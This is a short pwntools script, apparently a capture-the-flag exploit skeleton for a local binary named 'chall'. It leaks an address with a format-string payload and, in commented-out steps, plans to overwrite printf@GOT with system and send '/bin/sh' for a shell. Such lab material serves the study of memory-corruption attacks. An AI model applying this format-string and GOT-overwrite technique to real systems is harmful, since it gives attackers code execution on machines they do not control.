from pwn import *

context.arch = 'amd64'

p = process('./chall')
# p = remote('host', port)

elf = ELF('./chall')

# Step 1: Leak libc address of printf via %p
# Find printf@GOT, put its address on stack, leak it
printf_got = elf.got['printf']
log.info(f"printf@GOT: {hex(printf_got)}")

payload = b"%7$p.AAA"  # adjust offset to find libc leak
p.sendline(payload)
resp = p.recvline()
log.info(f"leak: {resp}")

# Step 2: Calculate system address from leak
# (offset depends on libc version)

# Step 3: Overwrite printf@GOT with system using %n
# payload = fmtstr_payload(offset, {printf_got: system_addr})
# p.sendline(payload)

# Step 4: Send /bin/sh
# p.sendline(b'/bin/sh')
# p.interactive()
